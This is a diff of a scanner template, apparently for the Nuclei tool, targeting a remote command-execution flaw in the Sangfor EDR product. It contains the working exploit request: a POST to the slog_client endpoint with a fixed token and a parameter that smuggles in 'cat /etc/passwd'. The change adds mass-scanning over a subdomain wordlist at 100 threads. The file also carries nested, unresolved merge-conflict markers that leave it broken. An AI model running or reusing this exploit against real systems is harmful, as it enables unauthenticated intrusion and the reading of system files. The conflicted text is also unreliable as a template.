@@ -5,6 +5,7 @@ info:
   author: pikpikcu
   severity: critical
 <<<<<<< HEAD
+<<<<<<< HEAD
   description: A vulnerability in Sangfor EDR product allows remote unauthenticated users to cause the product to execute arbitrary commands.
   reference:
     - https://www.cnblogs.com/0day-li/p/13650452.html
@@ -20,23 +21,31 @@ info:
   metadata:
     fofa-query: app="sangfor"
   tags: rce,sangfor
+=======
+  reference: https://www.cnblogs.com/0day-li/p/13650452.html
+  tags: rce
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - method: POST
-    path:
-      - "{{BaseURL}}/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9"
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-    body: |
-      {"params":"w=123\"'1234123'\"|cat /etc/passwd"}
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        {"params":"w=123\"'1234123'\"|cat /etc/passwd"}
     matchers-condition: and
     matchers:
       - type: regex
-        part: body
         regex:
-          - "root:.*:0:0:"
-
+          - "root:.*:0:0"
+        part: body
       - type: status
         status:
           - 200
